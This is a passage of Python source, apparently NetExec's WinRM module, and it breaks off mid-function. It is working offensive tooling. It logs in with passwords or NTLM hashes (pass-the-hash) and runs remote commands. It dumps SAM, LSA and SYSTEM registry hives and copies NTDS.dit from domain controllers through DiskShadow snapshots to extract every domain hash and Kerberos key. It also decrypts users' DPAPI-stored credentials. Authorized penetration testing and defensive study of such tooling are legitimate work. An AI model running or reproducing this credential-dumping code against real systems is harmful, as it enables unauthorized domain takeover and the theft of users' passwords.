import os
import base64
import contextlib
import re
import tempfile
import traceback
import requests
import urllib3
import logging
import ntpath
import xml.etree.ElementTree as ET

from pypsrp.wsman import NAMESPACES
from pypsrp.client import Client
from pypsrp.powershell import PSDataStreams
from termcolor import colored

from dploot.lib.utils import is_guid, is_credfile
from impacket.dpapi import MasterKeyFile, MasterKey, CredHist, DomainKey, CredentialFile, deriveKeysFromUser, DPAPI_BLOB, CREDENTIAL_BLOB
from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes, NTDSHashes
from impacket.uuid import bin_to_string

from nxc.config import process_secret, host_info_colors
from nxc.connection import connection
from nxc.helpers.bloodhound import add_user_bh
from nxc.helpers.logger import highlight
from nxc.helpers.misc import gen_random_string, validate_ntlm
from nxc.helpers.negotiate_parser import parse_challenge
from nxc.logger import NXCAdapter
from nxc.paths import TMP_PATH
from nxc.protocols.winrm.ntds import (
    CLEANUP_COUNT_RE,
    CLEANUP_DELETING_RE,
    EXPOSE_CONFIRM_RE,
    build_cleanup_script,
    build_create_script,
    build_delete_only_script,
    parse_alias_guid,
    read_ntds_path,
)

urllib3.disable_warnings()


class winrm(connection):
    def __init__(self, args, db, host):
        self.domain = ""
        self.targedDomain = ""
        self.server_os = None
        self.endpoint = None
        self.lmhash = ""
        self.nthash = ""
        self.ssl = False
        self.challenge_header = None
        self.targetDomain = None
        self.no_ntlm = False

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        # For more details, please check the function "print_host_info"
        logging.getLogger("pypsrp").disabled = True
        logging.getLogger("pypsrp.wsman").disabled = True
        self.logger = NXCAdapter(
            extra={
                "protocol": "WINRM",
                "host": self.host,
                "port": "5985",
                "hostname": self.hostname,
            }
        )

    def enum_host_info(self):
        try:
            ntlm_info = parse_challenge(base64.b64decode(self.challenge_header.split(" ")[1].replace(",", "")))
        except Exception as e:
            self.logger.debug(f"Error parsing NTLM challenge: {e!s}")
            self.logger.debug(f"Raw challenge: {self.challenge_header.split(' ')[1].replace(',', '')[:20]}...")
            self.logger.error("Invalid NTLM challenge received from server. This may indicate NTLM is not supported and nxc winrm only support NTLM currently")
            self.no_ntlm = True
            return False

        self.targetDomain = self.domain = ntlm_info["domain"]
        self.hostname = ntlm_info["hostname"]
        self.server_os = ntlm_info["os_version"]
        self.logger.extra["hostname"] = self.hostname

        try:
            self.db.add_host(self.host, self.port, self.hostname, self.targetDomain, self.server_os)
        except Exception as e:
            self.logger.debug(f"Error adding host to database: {e!s}")

        if self.args.domain:
            self.domain = self.args.domain
        if self.args.local_auth:
            self.domain = self.hostname

        if not self.kdcHost and self.domain and self.domain == self.targetDomain:
            result = self.resolver(self.domain)
            self.kdcHost = result["host"] if result else None
            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")

    def print_host_info(self):
        self.logger.extra["protocol"] = "WINRM-SSL" if self.ssl else "WINRM"
        self.logger.extra["port"] = self.port
        ntlm = colored(f"(NTLM:{not self.no_ntlm})", host_info_colors[2], attrs=["bold"]) if self.no_ntlm else ""
        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.targetDomain}) {ntlm}")

    def create_conn_obj(self):
        if self.is_link_local_ipv6:
            self.logger.fail("winrm not support link-local ipv6, exiting...")
            return False

        endpoints = {}

        headers = {
            "Content-Length": "0",
            "Keep-Alive": "true",
            "Content-Type": "application/soap+xml;charset=UTF-8",
            "User-Agent": "Microsoft WinRM Client",
            "Authorization": "Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="
        }

        for protocol in self.args.check_proto:
            endpoints[protocol] = {}
            endpoints[protocol]["port"] = self.port[self.args.check_proto.index(protocol)] if len(self.port) == 2 else self.port[0]
            endpoints[protocol]["url"] = "{}://{}:{}/wsman".format(
                protocol,
                self.host if not self.is_ipv6 else f"[{self.host}]",
                endpoints[protocol]["port"]
            )
            endpoints[protocol]["ssl"] = (protocol != "http")

        for protocol in endpoints:
            self.port = endpoints[protocol]["port"]
            try:
                self.logger.debug(f"Requesting URL: {endpoints[protocol]['url']}")
                res = requests.post(endpoints[protocol]["url"], headers=headers, verify=False, timeout=self.args.http_timeout)
                self.logger.debug(f"Received response code: {res.status_code}")
                self.challenge_header = res.headers["WWW-Authenticate"]
                if (not self.challenge_header) or ("Negotiate" not in self.challenge_header):
                    self.logger.info('Failed to get NTLM challenge from target "/wsman" endpoint, maybe isn\'t winrm service.')
                    return False
                self.endpoint = endpoints[protocol]["url"]
                self.ssl = endpoints[protocol]["ssl"]
                return True
            except requests.exceptions.Timeout as e:
                self.logger.info(f"Connection Timed out to WinRM service: {e}")
            except requests.exceptions.ConnectionError as e:
                if "Max retries exceeded with url" in str(e):
                    self.logger.info("Connection Timeout to WinRM service (max retries exceeded)")
                else:
                    self.logger.info(f"Other ConnectionError to WinRM service: {e}")
        return False

    def check_if_admin(self):
        wsman = self.conn.wsman
        wsen = NAMESPACES["wsen"]
        wsmn = NAMESPACES["wsman"]

        enum_msg = ET.Element(f"{{{wsen}}}Enumerate")
        ET.SubElement(enum_msg, f"{{{wsmn}}}OptimizeEnumeration")
        ET.SubElement(enum_msg, f"{{{wsmn}}}MaxElements").text = "32000"

        wsman.enumerate("http://schemas.microsoft.com/wbem/wsman/1/windows/shell", enum_msg)
        self.admin_privs = True
        return True

    def plaintext_login(self, domain, username, password):
        # Add server hostname to the Workstation field in NTLM Authenticate Message (Message 3)
        # This helps fix false negatives during NTLM auth — see issue #694 for details
        os.environ["NETBIOS_COMPUTER_NAME"] = self.hostname
        self.admin_privs = False
        self.password = password
        self.username = username
        self.domain = domain
        try:
            self.conn = Client(
                self.host,
                port=self.port,
                auth="ntlm",
                username=f"{self.domain}\\{self.username}",
                password=self.password,
                ssl=self.ssl,
                cert_validation=False,
            )

            self.check_if_admin()
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")

            self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
            self.db.add_credential("plaintext", domain, self.username, self.password)
            user_id = self.db.get_credential("plaintext", domain, self.username, self.password)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)

            if self.admin_privs:
                self.logger.debug("Inside admin privs")
                self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host, user_id=user_id)  # , user_id=user_id)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True
        except Exception as e:
            if "with ntlm" in str(e):
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)}")
            else:
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {e!s}")
            return False

    def hash_login(self, domain, username, ntlm_hash):
        # Add server hostname to the Workstation field in NTLM Authenticate Message (Message 3)
        # This helps fix false negatives during NTLM auth — see issue #694 for details
        os.environ["NETBIOS_COMPUTER_NAME"] = self.hostname
        self.admin_privs = False
        lmhash = "00000000000000000000000000000000"
        nthash = ""
        self.username = username
        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(":") != -1:
            lmhash, nthash = ntlm_hash.split(":")
        else:
            nthash = ntlm_hash

        self.lmhash = lmhash
        self.nthash = nthash
        self.domain = domain

        try:
            self.conn = Client(
                self.host,
                port=self.port,
                auth="ntlm",
                username=f"{self.domain}\\{self.username}",
                password=f"{self.lmhash}:{self.nthash}",
                ssl=self.ssl,
                cert_validation=False,
            )

            self.check_if_admin()
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(nthash)} {self.mark_pwned()}")

            self.db.add_credential("hash", domain, self.username, ntlm_hash)
            user_id = self.db.get_credential("hash", domain, self.username, ntlm_hash)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)

            if self.admin_privs:
                self.db.add_admin_user("hash", domain, self.username, nthash, self.host, user_id=user_id)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True

        except Exception as e:
            if "with ntlm" in str(e):
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)}")
            else:
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {e!s}")
            return False

    def execute(self, payload=None, get_output=False, shell_type="cmd"):
        if not payload:
            payload = self.args.execute

        try:
            result = self.conn.execute_cmd(payload, encoding=self.args.codec) if shell_type == "cmd" else self.conn.execute_ps(payload)
        except Exception as e:
            # Reference: https://github.com/diyan/pywinrm/issues/275
            if hasattr(e, "code") and e.code == 5:
                self.logger.fail(f"Execute command failed, current user: '{self.domain}\\{self.username}' has no 'Invoke' rights to execute command (shell type: {shell_type})")

                if shell_type == "cmd":
                    self.logger.info("Cannot execute command via cmd, the user probably does not have invoke rights with Root WinRM listener - now switching to Powershell to attempt execution")
                    self.execute(payload, get_output, shell_type="powershell")
            elif ("decode" in str(e)) and not get_output:
                self.logger.success(f"Executed command (shell type: {shell_type})")
            else:
                self.logger.fail(f"Execute command failed, error: {e!s}")
        else:
            if get_output:
                return result[0]
            self.logger.success(f"Executed command (shell type: {shell_type})")
            if not self.args.no_output:
                if shell_type == "powershell":
                    result: tuple[str, PSDataStreams, bool]
                    if result[2]:
                        self.logger.fail("Error executing powershell command, non-zero return code")
                    for out_type in ["debug", "verbose", "information", "progress", "warning", "error"]:
                        stream: list[str] = getattr(result[1], out_type)
                        for msg in stream:
                            if str(msg) != "None":
                                if out_type == "error":
                                    self.logger.fail(str(msg).rstrip())
                                else:
                                    self.logger.display(str(msg).rstrip())
                    # Display stdout
                    for line in result[0].splitlines():
                        self.logger.highlight(line.rstrip())
                else:
                    # Tuple of (stdout, stderr, returncode)
                    result: tuple[str, str, int]
                    if result[2] == 0:
                        for line in result[0].replace("\r", "").splitlines():
                            self.logger.highlight(line.rstrip())
                    else:
                        for line in result[1].replace("\r", "").splitlines():
                            self.logger.fail(line.rstrip())

    def ps_execute(self, payload=None, get_output=False):
        command = payload if payload else self.args.ps_execute
        result = self.execute(payload=command, get_output=get_output, shell_type="powershell")
        if get_output:
            return result

    def _run_cmd(self, cmd):
        """Run a CMD command and return stdout, stderr, and exit code."""
        try:
            return self.conn.execute_cmd(cmd, encoding=self.args.codec)
        except Exception as e:
            if not (hasattr(e, "code") and e.code == 5):
                raise
            self.logger.debug(f"cmd shell invoke denied (code 5), retrying via PowerShell runspace: {e}")
        escaped = cmd.replace("'", "''")
        stdout, streams, _ = self.conn.execute_ps(f"cmd /c '{escaped}'; \"NXC_RC=$LASTEXITCODE\"")
        # Native stderr arrives in PowerShell's error stream.
        stderr = "\n".join(str(err) for err in (getattr(streams, "error", None) or []))
        match = re.search(r"NXC_RC=(\d+)", stdout or "")
        if not match:
            raise RuntimeError(f"No exit code marker in the PowerShell fallback output for {cmd!r}")
        stdout = re.sub(r"\r?\n?NXC_RC=\d+", "", stdout or "")
        return stdout, stderr, int(match.group(1))

    def get_file(self, remote_path=None, download_path=None):
        remote_path = remote_path if remote_path else self.args.get_file[0]
        local_path = download_path if download_path else self.args.get_file[1]

        # Do a bit of smart handling for the local file path
        if local_path.endswith("/"):
            local_path += ntpath.basename(remote_path)
        try:
            self.logger.display(f'Downloading "{remote_path}" to "{local_path}"')
            self.conn.fetch(remote_path, local_path)
            self.logger.success(f"File {remote_path} has been saved to {local_path}")
        except Exception as e:
            self.logger.fail(f"Failed to get file {remote_path}, error: {e!s}")

    def put_file(self, local_path=None, remote_path=None):
        local_path = local_path if local_path else self.args.put_file[0]
        remote_path = remote_path if remote_path else self.args.put_file[1]

        # Do a bit of smart handling for the remote file path
        remote_path += os.path.basename(local_path) if remote_path.endswith(("\\", "/")) else ""
        try:
            self.logger.display(f'Uploading "{local_path}" to "{remote_path}"')
            self.conn.copy(local_path, remote_path)
            self.logger.success(f"File {local_path} has been uploaded to {remote_path}")
        except Exception as e:
            self.logger.fail(f"Failed to put file {local_path} to {remote_path}, error: {e!s}")

    def dir(self, directory=None):
        directory = directory if directory else self.args.dir
        out = self.execute(f"dir {directory}", True)
        if out is not None:
            for line in out.splitlines():
                self.logger.highlight(line.rstrip())

    # Dos attack prevent:
    # if someboby executed "reg save HKLM\sam C:\windows\temp\sam" before, but didn't remove "C:\windows\temp\sam" file,
    # when user execute the same command next time, in tty shell, the prompt will ask "File C:\windows\temp\sam already exists. Overwrite (Yes/No)?"
    # but in here, it isn't not a tty shell, pypsrp will do a crazy loop command execution when it didn't get any response (stuck in "Yes/No" prompt)
    # and it will make target host OOM error just like dos attack.
    # To prevent that, just make the store file name randomly.
    def sam(self):
        sam_storename = gen_random_string(6)
        system_storename = gen_random_string(6)
        dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
        clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
        output_filename = self.output_file_template.format(output_folder="sam")
        try:
            self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
            self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", output_filename + ".sam")
            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", output_filename + ".system")
            self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
        except Exception as e:
            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
                self.logger.fail("Failed to dump SAM hashes, it may have been detected by AV or current user is not privileged user")
            elif hasattr(e, "code") and e.code == 5:
                self.logger.fail(f"Dump SAM hashes with {self.args.dump_method} failed, please try '--dump-method'")
            else:
                self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
        else:
            self.logger.display("Dumping SAM hashes")
            local_operations = LocalOperations(f"{output_filename}.system")
            boot_key = local_operations.getBootKey()
            SAM = SAMHashes(
                f"{output_filename}.sam",
                boot_key,
                isRemote=None,
                perSecretCallback=lambda secret: self.logger.highlight(secret),
            )
            SAM.dump()
            SAM.export(output_filename)

    def lsa(self):
        security_storename = gen_random_string(6)
        system_storename = gen_random_string(6)
        dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
        clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
        output_filename = self.output_file_template.format(output_folder="lsa")
        try:
            self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
            self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
            self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
        except Exception as e:
            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
                self.logger.fail("Failed to dump LSA secrets, it may have been detected by AV or current user is not privileged user")
            elif hasattr(e, "code") and e.code == 5:
                self.logger.fail(f"Dump LSA secrets with {self.args.dump_method} failed, please try '--dump-method'")
            else:
                self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
        else:
            self.logger.display("Dumping LSA secrets")
            local_operations = LocalOperations(f"{output_filename}.system")
            boot_key = local_operations.getBootKey()
            LSA = LSASecrets(
                f"{output_filename}.security",
                boot_key,
                None,
                isRemote=None,
                perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
            )
            LSA.dumpCachedHashes()
            LSA.dumpSecrets()

    def ntds(self):
        """Get NTDS.dit with DiskShadow and parse it using the SYSTEM hive."""
        if not self._check_backup_privilege():
            return

        try:
            stdout, _, rc = self._run_cmd("echo %TEMP%")
            if rc != 0 or not stdout.strip():
                self.logger.fail("Could not resolve the remote temp directory")
                return
            remote_temp = stdout.strip().splitlines()[-1]

            run_id = gen_random_string(8).lower()
            alias = f"vss{run_id}"
            staging_dir = f"{remote_temp}\\nxc_{run_id}"
            script_path = f"{staging_dir}\\create.dsh"
            metadata_path = f"{staging_dir}\\metadata.cab"

            _, stderr, rc = self._run_cmd(f'mkdir "{staging_dir}"')
            if rc != 0:
                self.logger.fail(f"Could not create staging directory: {stderr.strip()}")
                return
        except Exception as e:
            self.logger.fail(f"Could not prepare the NTDS dump: {e}")
            return

        output_base = f"{self.output_file_template.format(output_folder='ntds')}_{run_id}"
        local_ntds = f"{output_base}.dit"
        local_system = f"{output_base}.system"

        shadow_guid = None
        drive_letter = None
        exposed = False
        ntds_ok = False
        system_ok = False
        try:
            os.makedirs(os.path.dirname(output_base), exist_ok=True)
            # Read the NTDS path from the saved hive because reg query may be denied.
            _, _, reg_rc = self._run_cmd(f'reg save HKLM\\SYSTEM "{staging_dir}\\SYSTEM" /y')
            if reg_rc != 0:
                self.logger.fail("Could not save the SYSTEM hive")
                return
            system_ok = self._download(f"{staging_dir}\\SYSTEM", local_system, "SYSTEM")
            if not system_ok:
                return

            ntds_path = self._get_ntds_location(local_system)
            if not ntds_path:
                self.logger.fail("Could not determine the NTDS database location (is this a Domain Controller?)")
                return
            self.logger.debug(f"NTDS database located at {ntds_path}")

            drive_letter = self._pick_drive()
            if not drive_letter:
                return

            if not self._upload(build_create_script(alias, ntds_path[:2], drive_letter, metadata_path), script_path):
                return

            self.logger.display("Creating DiskShadow snapshot...")
            try:
                stdout, stderr, ds_rc = self._run_cmd(f'diskshadow /s "{script_path}"')
            except Exception as e:
                self.logger.fail(f"Could not run DiskShadow: {e}. A snapshot may remain on the target")
                return

            # Keep the GUID if DiskShadow fails after creating the snapshot.
            try:
                shadow_guid = parse_alias_guid(stdout, alias)
            except ValueError as e:
                self.logger.fail(f"DiskShadow returned multiple snapshot GUIDs: {e}. A snapshot may remain on the target")
                return

            expose_matches = EXPOSE_CONFIRM_RE.findall(stdout)
            exposed = len(expose_matches) == 1 and expose_matches[0].upper() == drive_letter

            if ds_rc != 0:
                self.logger.fail(f"DiskShadow returned exit code {ds_rc}")
                for line in stdout.splitlines():
                    if line.strip():
                        self.logger.display(f"  [stdout] {line}")
                for line in stderr.splitlines():
                    if line.strip():
                        self.logger.fail(f"  [stderr] {line}")
                if shadow_guid is None:
                    self.logger.fail("No snapshot GUID was found, so a snapshot may remain on the target")
                return

            if not shadow_guid:
                self.logger.fail("No snapshot GUID was found in the DiskShadow output, so a snapshot may remain on the target")
                return

            if not exposed:
                self.logger.fail(f"DiskShadow did not confirm that the snapshot was exposed on {drive_letter}:")
                return

            self.logger.display("Acquiring NTDS database and SYSTEM hive...")
            ntds_dir = ntpath.dirname(ntds_path)[3:]
            ntds_filename = ntpath.basename(ntds_path)
            robocopy_src = f"{drive_letter}:\\{ntds_dir}" if ntds_dir else f"{drive_letter}:\\"
            _, _, rob_rc = self._run_cmd(f'robocopy "{robocopy_src}" "{staging_dir}" "{ntds_filename}" /b /r:2 /w:1 /j')
            # Robocopy considers exit codes 0 through 7 successful.
            if rob_rc >= 8:
                self.logger.fail(f"Could not copy {ntds_filename} from the snapshot (exit code {rob_rc})")
                return

            ntds_ok = self._download(f"{staging_dir}\\{ntds_filename}", local_ntds, ntds_filename)
        except Exception as e:
            self.logger.fail(f"Could not acquire NTDS.dit and the SYSTEM hive: {e}")
            return
        finally:
            try:
                self._ntds_cleanup(shadow_guid, drive_letter, exposed, staging_dir)
            except Exception as e:
                self.logger.fail(f"Cleanup failed: {e}")
            if not (ntds_ok and system_ok):
                # Remove only files downloaded by this run.
                for partial, ok in ((local_ntds, ntds_ok), (local_system, system_ok)):
                    if ok:
                        with contextlib.suppress(OSError):
                            os.unlink(partial)

        if ntds_ok and system_ok:
            self._dump_ntds(local_ntds, local_system, output_base)
        else:
            self.logger.fail("Could not download both the NTDS database and SYSTEM hive")

    def _check_backup_privilege(self):
        try:
            stdout, _, _ = self._run_cmd("whoami /priv /fo csv /nh")
        except Exception as e:
            self.logger.fail(f"Could not check SeBackupPrivilege: {e}")
            return False
        for line in stdout.splitlines():
            parts = [p.strip('"') for p in line.split('","')]
            if len(parts) >= 3 and parts[0].upper() == "SEBACKUPPRIVILEGE":
                if parts[2].upper() != "ENABLED":
                    self.logger.display("SeBackupPrivilege is present but disabled. Continuing anyway.")
                else:
                    self.logger.success("SeBackupPrivilege confirmed")
                return True
        self.logger.fail("SeBackupPrivilege was not found... aborting...")
        return False

    def _get_ntds_location(self, system_hive):
        """Read the configured NTDS database path from the saved SYSTEM hive."""
        try:
            return read_ntds_path(system_hive)
        except Exception as e:
            self.logger.debug(f"Could not parse the SYSTEM hive: {e}")
            return None

    def _pick_drive(self):
        """Return the highest available drive letter from Z to D, or None."""
        output = self.execute(
            "[System.IO.DriveInfo]::GetDrives() | ForEach-Object { $_.Name }",
            True,
            shell_type="powershell",
        )
        if not output:
            self.logger.fail("Could not enumerate the remote drives")
            return None
        occupied = {line.strip()[:2].upper() for line in output.splitlines() if line.strip()}
        for letter in "ZYXWVUTSRQPONMLKJIHGFED":
            if f"{letter}:" not in occupied:
                self.logger.debug(f"Selected drive letter: {letter}:")
                return letter
        self.logger.fail("No free drive letter available between D: and Z:")
        return None

    def _upload(self, content, remote_path):
        local_path = None
        try:
            with tempfile.NamedTemporaryFile(mode="w", newline="", suffix=".dsh", delete=False) as tmp:
                tmp.write(content)
                local_path = tmp.name
            self.conn.copy(local_path, remote_path)
            return True
        except Exception as e:
            self.logger.fail(f"Could not upload script to {remote_path}: {e}")
            return False
        finally:
            if local_path:
                with contextlib.suppress(FileNotFoundError, OSError):
                    os.unlink(local_path)

    def _download(self, remote_path, local_path, label):
        if os.path.exists(local_path):
            self.logger.fail(f"Not downloading {label}: {local_path} already exists")
            return False
        try:
            self.conn.fetch(remote_path, local_path)
            return True
        except Exception as e:
            self.logger.fail(f"Could not download {label}: {e}")
            with contextlib.suppress(OSError):
                os.unlink(local_path)
            return False

    def _ntds_cleanup(self, shadow_guid, drive_letter, exposed, staging_dir):
        """Remove the snapshot and staging files created by this run."""
        cleanup_ok = False
        if shadow_guid:
            script = build_cleanup_script(drive_letter, shadow_guid) if exposed else build_delete_only_script(shadow_guid)
            cleanup_path = f"{staging_dir}\\cleanup.dsh"
            if self._upload(script, cleanup_path):
                try:
                    ds_stdout, _, ds_rc = self._run_cmd(f'diskshadow /s "{cleanup_path}"')
                    m = CLEANUP_DELETING_RE.search(ds_stdout)
                    guid_confirmed = m and m.group(1).upper() == shadow_guid.upper()
                    count_confirmed = CLEANUP_COUNT_RE.search(ds_stdout)

                    if ds_rc == 0 and guid_confirmed and count_confirmed:
                        cleanup_ok = True
                    else:
                        self.logger.fail(f"Could not remove snapshot {{{shadow_guid}}}. Snapshot {{{shadow_guid}}} may remain on the target")
                except Exception as e:
                    self.logger.fail(f"Could not remove snapshot {{{shadow_guid}}}: {e}. Snapshot {{{shadow_guid}}} may remain on the target")
            else:
                self.logger.fail(f"Could not upload the cleanup script. Snapshot {{{shadow_guid}}} may remain on the target")

        try:
            _, _, rm_rc = self._run_cmd(f'rmdir /s /q "{staging_dir}"')
            if rm_rc != 0:
                self.logger.fail(f"Could not remove staging directory: {staging_dir}")
                cleanup_ok = False
        except Exception as e:
            self.logger.fail(f"Could not remove staging directory {staging_dir}: {e}")
            cleanup_ok = False
        if cleanup_ok:
            self.logger.success("Remote artifacts and shadow copy removed")

    def _dump_ntds(self, ntds_file, system_file, output_filename):
        """Parse the downloaded NTDS database using the SYSTEM hive."""
        host_id = self.db.get_hosts(filter_term=self.host)[0][0]
        printed_kerb_keys_banner = False

        def add_hash(secret_type, secret, host_id):
            nonlocal printed_kerb_keys_banner
            if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
                self.logger.display("Kerberos keys:")
                printed_kerb_keys_banner = True

            if secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
                add_hash.kerb_secrets += 1
            else:
                add_hash.nt_lm_secrets += 1

            if self.args.enabled:
                if "Enabled" in secret:
                    secret = " ".join(secret.split(" ")[:-1])
                    self.logger.highlight(secret)
            else:
                secret = " ".join(secret.split(" ")[:-1]) if " " in secret else secret
                self.logger.highlight(secret)

            # Store only current user NTLM hashes in the database.
            if secret.find("$") == -1 and secret_type == NTDSHashes.SECRET_TYPE.NTDS and "_history" not in secret:
                if secret.find("\\") != -1:
                    domain, clean_hash = secret.split("\\")
                else:
                    domain = self.domain
                    clean_hash = secret

                try:
                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
                    parsed_hash = f"{lmhash}:{nthash}"
                    if validate_ntlm(parsed_hash):
                        self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
                        add_hash.added_to_db += 1
                        return
                    raise
                except Exception:
                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
            else:
                self.logger.debug("Dumped hash is a computer account, not adding to db")

        add_hash.nt_lm_secrets = 0
        add_hash.kerb_secrets = 0
        add_hash.added_to_db = 0

        NTDS = None
        try:
            bootkey = LocalOperations(system_file).getBootKey()
            NTDS = NTDSHashes(
                ntds_file,
                bootkey,
                isRemote=False,
                history=self.args.history,
                noLMHash=True,
                useVSSMethod=True,
                justNTLM=not self.args.kerberos_keys,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=output_filename,
                justUser=self.args.userntds or None,
                printUserStatus=True,
                perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret, host_id),
            )
            self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
            NTDS.dump()
            ntds_outfile = f"{output_filename}.ntds"
            self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile} of which {highlight(add_hash.added_to_db)} were added to the database")
            if self.args.kerberos_keys:
                self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
        except Exception as e:
            self.logger.fail(e)
        if NTDS is not None:
            NTDS.finish()

    def dpapi(self):
        """
        Find and unlock Credential Manager masterkeys and credentials owned by user.
        The flow is inspired by and a simplified version of dploot's triage methods for user masterkeys and credentials.
        Actual decryption of keys and credentials is taken and adapted from impacket-dpapi.
        """
        user_masterkey_path = ntpath.join("C:\\Users", self.username, "AppData\\Roaming\\Microsoft\\Protect")
        user_credentials_paths = [
            ntpath.join("C:\\Users", self.username, "AppData\\Roaming\\Microsoft\\Credentials"),
            ntpath.join("C:\\Users", self.username, "AppData\\Local\\Microsoft\\Credentials")
        ]

        self.logger.display("Collecting DPAPI masterkeys...")

        sids = self.ps_execute(f"Get-ChildItem -Path {user_masterkey_path} -Name -Directory -Include 'S-*'", True)
        if not sids:
            self.logger.fail(f"No masterkeys found for user {self.username}")
            return

        masterkeys = []
        for sid in sids.splitlines():
            keys_path = ntpath.join(user_masterkey_path, sid.strip())
            keys = self.ps_execute(f"Get-ChildItem -Path {keys_path} -Name -Hidden -File -Exclude 'Preferred'", True)
            for key in keys.splitlines():
                stripped_key = key.strip()
                if is_guid(stripped_key):
                    key_path = ntpath.join(keys_path, stripped_key)
                    self.logger.debug(f"Found masterkey file {key_path}")
                    local_key_file = f"{TMP_PATH}/{stripped_key}"
                    self.conn.fetch(key_path, local_key_file)
                    decrypted_key = self.get_master_key(local_key_file, sid, self.password)
                    if decrypted_key:
                        masterkeys.append((stripped_key, decrypted_key))

        if not masterkeys:
            self.logger.fail("Could not decrypt any keys")
            return

        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")

        credential_files = []
        for user_credentials_path in user_credentials_paths:
            creds = self.ps_execute(f"Get-ChildItem -Path {user_credentials_path} -Name -Hidden -File", True)
            for cred_file in creds.splitlines():
                stripped_cred_file = cred_file.strip()
                if is_credfile(stripped_cred_file):
                    creds_path = ntpath.join(user_credentials_path, stripped_cred_file)
                    self.logger.debug(f"Found credentials file {creds_path}")
                    local_cred_file = f"{TMP_PATH}/{stripped_cred_file}"
                    self.conn.fetch(creds_path, local_cred_file)
                    credential_files.append(local_cred_file)

        if not credential_files:
            self.log.fail(f"No credential files found for user {self.username}")
            return

        for creds_file in credential_files:
            with open(creds_file, "rb") as fp:
                data = fp.read()
            cred = CredentialFile(data)
            blob = DPAPI_BLOB(cred["Data"])

            guid_masterkey = bin_to_string(blob["GuidMasterKey"])
            right_key = next((key for guid, key in masterkeys if guid.lower() == guid_masterkey.lower()), None)

            if right_key is not None:
                try:
                    decrypted = blob.decrypt(right_key)
                    if decrypted is not None:
                        self.logger.debug(f"Successfully decrypted credentials in {creds_file}:")
                        creds = CREDENTIAL_BLOB(decrypted)
                        if creds["Unknown3"] != b"":
                            target = creds["Target"].decode("utf-16le")
                            username = creds["Username"].decode("utf-16le")
                            try:
                                password = creds["Unknown3"].decode("utf-16le")
                            except UnicodeDecodeError:
                                password = creds["Unknown3"].decode("latin-1")
                            self.logger.highlight(f"{target} - {username}:{password}")
                except Exception as e:
                    self.logger.fail(f"Failed to decrypt credentials in {creds_file} with masterkey: {e!s}")
                    self.logger.debug(traceback.format_exc())
            else:
                self.logger.fail(f"No matching masterkey found for credentials in {creds_file} (need {guid_masterkey})")

    def get_master_key(self, masterkey_file, sid, password):
        """
        Taken and adapted from impacket.examples.dpapi
        Could be cleaned up but the more we deviate from the original the harder it will be to maintain it
        """
        with open(masterkey_file, "rb") as fp:
            data = fp.read()
        mkf = MasterKeyFile(data)
        data = data[len(mkf):]

        if mkf["MasterKeyLen"] > 0:
            mk = MasterKey(data[:mkf["MasterKeyLen"]])
            data = data[len(mk):]

        if mkf["BackupKeyLen"] > 0:
